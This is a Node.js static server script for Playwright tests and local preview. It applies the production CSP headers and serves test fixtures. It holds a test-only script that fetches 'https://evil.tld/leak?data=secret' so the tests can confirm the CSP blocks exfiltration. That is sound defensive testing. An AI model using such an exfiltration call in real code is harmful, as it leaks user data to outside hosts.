// Minimal dependency-free static server for /public (used by Playwright + local preview).
// Mirrors Vercel's edge behavior by:
//   - serving from /public/,
//   - also exposing /fixtures/<name>.html from /tests/fixtures/ for adversarial tests,
//   - exposing /__test_exfil.js inline (so a same-origin script can attempt a remote fetch
//     and let us assert the CSP connect-src block from a Playwright test),
//   - applying the same security headers (CSP, etc.) that vercel.json sets in production.
import { createServer } from "node:http";
import { promises as fs } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const PUB = path.join(ROOT, "public");
const FIX = path.join(ROOT, "tests", "fixtures");
const PORT = Number(process.env.PORT) || 8765;

const TYPES = {
  ".html": "text/html; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".js": "text/javascript; charset=utf-8",
  ".json": "application/json; charset=utf-8",
  ".svg": "image/svg+xml",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".webp": "image/webp",
  ".woff2": "font/woff2",
};

// Pull the same security headers Vercel applies in production, so local tests catch CSP
// regressions before they ship.
const securityHeaders = {};
try {
  const cfg = JSON.parse(await fs.readFile(path.join(ROOT, "vercel.json"), "utf8"));
  const arr = cfg?.headers?.[0]?.headers || [];
  for (const h of arr) securityHeaders[h.key] = h.value;
} catch {
  // No vercel.json — tests will catch the missing CSP.
}

// Tiny same-origin script used by tests/fixtures/csp-exfil.html. It attempts to fetch a
// non-allowlisted host so the test can verify the CSP connect-src block.
const EXFIL_JS = `
// Test-only. Attempt a fetch to a host NOT in CSP connect-src; the browser must block it.
(async () => {
  try {
    const r = await fetch("https://evil.tld/leak?data=secret");
    window.__tzExfilResult = { ok: true, status: r.status };
  } catch (e) {
    window.__tzExfilResult = { ok: false, error: String(e).slice(0, 240) };
  }
})();
`;

createServer(async (req, res) => {
  const finish = (status, body, type, extra = {}) => {
    res.writeHead(status, { "content-type": type, ...securityHeaders, ...extra });
    res.end(body);
  };
  try {
    const url = new URL(req.url, "http://localhost");
    let pathname = decodeURIComponent(url.pathname);

    if (pathname === "/__test_exfil.js") {
      finish(200, EXFIL_JS, TYPES[".js"]);
      return;
    }

    let file;
    if (pathname.startsWith("/fixtures/")) {
      file = path.join(FIX, pathname.slice("/fixtures/".length));
      if (!file.startsWith(FIX)) { finish(403, "forbidden", "text/plain"); return; }
    } else {
      if (pathname.endsWith("/")) pathname += "index.html";
      file = path.join(PUB, pathname);
      if (!file.startsWith(PUB)) { finish(403, "forbidden", "text/plain"); return; }
    }

    const body = await fs.readFile(file);
    finish(200, body, TYPES[path.extname(file)] || "application/octet-stream");
  } catch {
    finish(404, "not found", "text/plain");
  }
}).listen(PORT, () => console.log(`serve: http://localhost:${PORT}`));
